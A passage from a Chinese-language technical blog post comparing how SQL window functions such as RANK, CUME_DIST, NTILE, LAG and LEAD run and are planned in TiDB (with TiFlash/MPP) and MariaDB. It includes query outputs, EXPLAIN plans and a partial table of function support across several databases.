└─ExchangeReceiver_15      <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span>               <span class="operator">|</span>                                                                                                                                        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>             └─ExchangeSender_14      <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span>               <span class="operator">|</span> ExchangeType: HashPartition, Hash Cols: [name: test.student.course, <span class="keyword">collate</span>: utf8mb4_bin]                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>               └─TableFullScan_13     <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> mpp[tiflash] <span class="operator">|</span> <span class="keyword">table</span>:student <span class="operator">|</span> keep <span class="keyword">order</span>:<span class="literal">false</span>, stats:pseudo                                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------+---------+--------------+---------------+----------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">9</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.002</span> sec)</span><br></pre></td></tr></table></figure></div>
<p><strong>从此用例可以看出，正常执行窗口函数时，TiKV 只做表扫，计算压力集中在 TiDB Server，而开启 MPP 后，计算压力可以分摊到 TiFlash 节点，计算完成后，再将结果集返回到 TiDB Server。</strong></p>
<ol start="5">
<li>MariaDB 10.6 中的执行计划</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> version()\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">version(): <span class="number">10.6</span><span class="number">.7</span><span class="operator">-</span>MariaDB<span class="operator">-</span>log</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> explain <span class="keyword">SELECT</span> <span class="built_in">RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `rank`, <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `row_num`, <span class="built_in">DENSE_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `dense_rank`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------------+---------+------+---------------+------+---------+------+------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> select_type <span class="operator">|</span> <span class="keyword">table</span>   <span class="operator">|</span> type <span class="operator">|</span> possible_keys <span class="operator">|</span> key  <span class="operator">|</span> key_len <span class="operator">|</span> <span class="keyword">ref</span>  <span class="operator">|</span> <span class="keyword">rows</span> <span class="operator">|</span> Extra           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------------+---------+------+---------------+------+---------+------+------+-----------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> SIMPLE      <span class="operator">|</span> student <span class="operator">|</span> <span class="keyword">ALL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>          <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">6</span>    <span class="operator">|</span> <span class="keyword">Using</span> temporary <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+-------------+---------+------+---------------+------+---------+------+------+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>MariaDB 对于窗口函数的实现方式是全表扫描并产生临时表（<code>Using temporary</code>）进行计算，对于分析型业务，这种处理方式会使临时数据落盘，通过临时文件的形式处理数据排序，存在的问题也是明显的，会增加磁盘IO的压力，而且是单点计算，不具备横向扩展性。</p>
<h4 id="CUME-DIST-PERCENT-RANK">CUME_DIST() / PERCENT_RANK()</h4>
<ol>
<li>功能描述</li>
</ol>
<ul>
<li>CUME_DIST()：返回一行数据的累积分布值（Cumulative distribution）。</li>
<li>PERCENT_RANK()：返回排行百分比值。</li>
</ul>
<ol start="2">
<li>执行结果</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">22</span>:<span class="number">08</span>:<span class="number">29</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">CUME_DIST</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `cume_dist`, <span class="built_in">PERCENT_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `pct_rank`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span> cume_dist <span class="operator">|</span> pct_rank           <span class="operator">|</span> course  <span class="operator">|</span> mark <span class="operator">|</span> name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">0.5</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Roger   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span>                  <span class="number">1</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Bilal   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">0.25</span> <span class="operator">|</span>                  <span class="number">0</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Voitto  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">0.75</span> <span class="operator">|</span> <span class="number">0.3333333333333333</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Thulile <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">0.75</span> <span class="operator">|</span> <span class="number">0.3333333333333333</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Pritha  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span>                  <span class="number">1</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">55</span> <span class="operator">|</span> Chun    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+--------------------+---------+------+---------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.016</span> sec)</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>执行计划</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">21</span>:<span class="number">57</span>:<span class="number">56</span><span class="operator">&gt;</span> explain <span class="keyword">SELECT</span> <span class="built_in">CUME_DIST</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `cume_dist`, <span class="built_in">PERCENT_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> `pct_rank`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                             <span class="operator">|</span> estRows <span class="operator">|</span> task         <span class="operator">|</span> access object <span class="operator">|</span> operator info                                                                                                          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Projection_6                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="keyword">Column</span>#<span class="number">7</span>, <span class="keyword">Column</span>#<span class="number">8</span>, test.student.course, test.student.mark, test.student.name                                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> └─Shuffle_13                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> execution info: concurrency:<span class="number">4</span>, data sources:[TableReader_11]                                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   └─Window_7                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">cume_dist</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">7</span>, <span class="built_in">percent_rank</span>()<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">8</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     └─Sort_12                  <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> test.student.course, test.student.mark:<span class="keyword">desc</span>                                                                            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       └─TableReader_11         <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> data:TableFullScan_10                                                                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         └─TableFullScan_10     <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> cop[tiflash] <span class="operator">|</span> <span class="keyword">table</span>:student <span class="operator">|</span> keep <span class="keyword">order</span>:<span class="literal">false</span>, stats:pseudo                                                                                         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.002</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="FIRST-VALUE-LAST-VALUE-NTH-VALUE-NTILE">FIRST_VALUE() / LAST_VALUE() / NTH_VALUE() / NTILE()</h4>
<ol>
<li>功能描述</li>
</ol>
<ul>
<li>FIRST_VALUE()：返回窗口框架第一行的参数值。</li>
<li>LAST_VALUE()：返回窗口框架最后一行的参数值。</li>
<li>NTH_VALUE()：返回窗口框架第N行的参数值。</li>
<li>NTILE()：将有序数据分为N个桶，返回当前行所在分区中的桶数。</li>
</ul>
<ol start="2">
<li>执行结果</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">22</span>:<span class="number">13</span>:<span class="number">04</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">FIRST_VALUE</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `<span class="keyword">first</span>`, <span class="built_in">LAST_VALUE</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `<span class="keyword">last</span>`, <span class="built_in">NTH_VALUE</span>(mark, <span class="number">2</span>) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `<span class="keyword">second</span>`, <span class="built_in">NTILE</span>(<span class="number">2</span>) <span class="keyword">over</span> w <span class="keyword">as</span> <span class="string">&#x27;ntile&#x27;</span>, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+--------+-------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">first</span> <span class="operator">|</span> <span class="keyword">last</span> <span class="operator">|</span> <span class="keyword">second</span> <span class="operator">|</span> ntile <span class="operator">|</span> course  <span class="operator">|</span> mark <span class="operator">|</span> name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+--------+-------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">70</span> <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Roger   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">70</span> <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>     <span class="number">60</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Bilal   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">70</span> <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span>   <span class="keyword">NULL</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Voitto  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">70</span> <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>     <span class="number">60</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Thulile <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">70</span> <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>     <span class="number">60</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Pritha  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">70</span> <span class="operator">|</span>   <span class="number">55</span> <span class="operator">|</span>     <span class="number">60</span> <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">55</span> <span class="operator">|</span> Chun    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+------+--------+-------+---------+------+---------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.021</span> sec)</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>执行计划</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">22</span>:<span class="number">12</span>:<span class="number">14</span><span class="operator">&gt;</span> explain <span class="keyword">SELECT</span> <span class="built_in">FIRST_VALUE</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `<span class="keyword">first</span>`, <span class="built_in">LAST_VALUE</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `<span class="keyword">last</span>`, <span class="built_in">NTH_VALUE</span>(mark, <span class="number">2</span>) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `<span class="keyword">second</span>`, <span class="built_in">NTILE</span>(<span class="number">2</span>) <span class="keyword">over</span> w <span class="keyword">as</span> <span class="string">&#x27;ntile&#x27;</span>, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                             <span class="operator">|</span> estRows <span class="operator">|</span> task         <span class="operator">|</span> access object <span class="operator">|</span> operator info                                                                                                                                                                                                                                            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Projection_8                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="keyword">Column</span>#<span class="number">10</span>, <span class="keyword">Column</span>#<span class="number">11</span>, <span class="keyword">Column</span>#<span class="number">12</span>, <span class="keyword">Column</span>#<span class="number">9</span>, test.student.course, test.student.mark, test.student.name                                                                                                                                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> └─Window_9                     <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">first_value</span>(test.student.mark)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">10</span>, <span class="built_in">last_value</span>(test.student.mark)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">11</span>, <span class="built_in">nth_value</span>(test.student.mark, <span class="number">2</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">12</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span> <span class="keyword">range</span> <span class="keyword">between</span> unbounded preceding <span class="keyword">and</span> <span class="keyword">current</span> <span class="type">row</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   └─Window_10                  <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">ntile</span>(<span class="number">2</span>)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">9</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span>)                                                                                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     └─Sort_16                  <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> test.student.course, test.student.mark:<span class="keyword">desc</span>                                                                                                                                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       └─TableReader_15         <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> data:TableFullScan_14                                                                                                                                                                                                                                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         └─TableFullScan_14     <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> cop[tiflash] <span class="operator">|</span> <span class="keyword">table</span>:student <span class="operator">|</span> keep <span class="keyword">order</span>:<span class="literal">false</span>, stats:pseudo                                                                                                                                                                                                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="LAG-LEAD">LAG() / LEAD()</h4>
<ol>
<li>功能描述</li>
</ol>
<ul>
<li>LAG()：返回分区中滞后于当前行的参数的值。</li>
<li>LEAD()：返回分区中领先于当前行的参数的值。</li>
</ul>
<ol start="2">
<li>执行结果</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">22</span>:<span class="number">16</span>:<span class="number">14</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">LAG</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `lag`, <span class="built_in">LEAD</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `lead`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span> lag  <span class="operator">|</span> lead <span class="operator">|</span> course  <span class="operator">|</span> mark <span class="operator">|</span> name    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+---------+------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Roger   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> Biology <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Bilal   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span> Voitto  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">70</span> <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Thulile <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>   <span class="number">55</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> Pritha  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> Maths   <span class="operator">|</span>   <span class="number">55</span> <span class="operator">|</span> Chun    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+---------+------+---------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.020</span> sec)</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>执行计划</li>
</ol>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB [test] <span class="number">22</span>:<span class="number">13</span>:<span class="number">25</span><span class="operator">&gt;</span> explain <span class="keyword">SELECT</span> <span class="built_in">LAG</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `lag`, <span class="built_in">LEAD</span>(mark) <span class="keyword">OVER</span> w <span class="keyword">AS</span> `lead`, course, mark, name <span class="keyword">FROM</span> student <span class="keyword">window</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> course <span class="keyword">ORDER</span> <span class="keyword">BY</span> mark <span class="keyword">DESC</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+--------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> id                             <span class="operator">|</span> estRows <span class="operator">|</span> task         <span class="operator">|</span> access object <span class="operator">|</span> operator info                                                                                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+--------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Projection_6                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="keyword">Column</span>#<span class="number">7</span>, <span class="keyword">Column</span>#<span class="number">8</span>, test.student.course, test.student.mark, test.student.name                                                              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> └─Shuffle_13                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> execution info: concurrency:<span class="number">4</span>, data sources:[TableReader_11]                                                                               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>   └─Window_7                   <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> <span class="built_in">lag</span>(test.student.mark)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">7</span>, <span class="built_in">lead</span>(test.student.mark)<span class="operator">-</span><span class="operator">&gt;</span><span class="keyword">Column</span>#<span class="number">8</span> <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> test.student.course <span class="keyword">order</span> <span class="keyword">by</span> test.student.mark <span class="keyword">desc</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     └─Sort_12                  <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> test.student.course, test.student.mark:<span class="keyword">desc</span>                                                                                                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       └─TableReader_11         <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> root         <span class="operator">|</span>               <span class="operator">|</span> data:TableFullScan_10                                                                                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>         └─TableFullScan_10     <span class="operator">|</span> <span class="number">6.00</span>    <span class="operator">|</span> cop[tiflash] <span class="operator">|</span> <span class="keyword">table</span>:student <span class="operator">|</span> keep <span class="keyword">order</span>:<span class="literal">false</span>, stats:pseudo                                                                                                             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+---------+--------------+---------------+--------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.003</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="常见数据库对窗口函数的支持情况">常见数据库对窗口函数的支持情况</h2>
<p>通过对几款常用数据库的调研比对，均支持常见的 11 种窗口函数。其中，在 openGauss 中，列存表目前只支持 <code>rank()</code> 和 <code>row_number()</code> 两个函数。另外，MariaDB 额外支持三种窗口函数，分别是 <code>MEDIAN() / PERCENTILE_CONT() / PERCENTILE_DISC()</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:center">#</th>
<th style="text-align:center">窗口函数</th>
<th style="text-align:center">TiDB(&gt;3.0)</th>
<th style="text-align:center">TiDB MPP(&gt;6.1)</th>
<th style="text-align:center">MySQL(&gt;8.0)</th>
<th style="text-align:center">MariaDB(&gt;10.2)</th>
<th style="text-align:center">openGauss</th>
<th style="text-align:center">OceanBase</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">RANK()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y(列存表)</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">ROW_NUMBER()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y(列存表)</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">DENSE_RANK()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">CUME_DIST()</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">cannot</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Y</td>
</tr>
<tr>
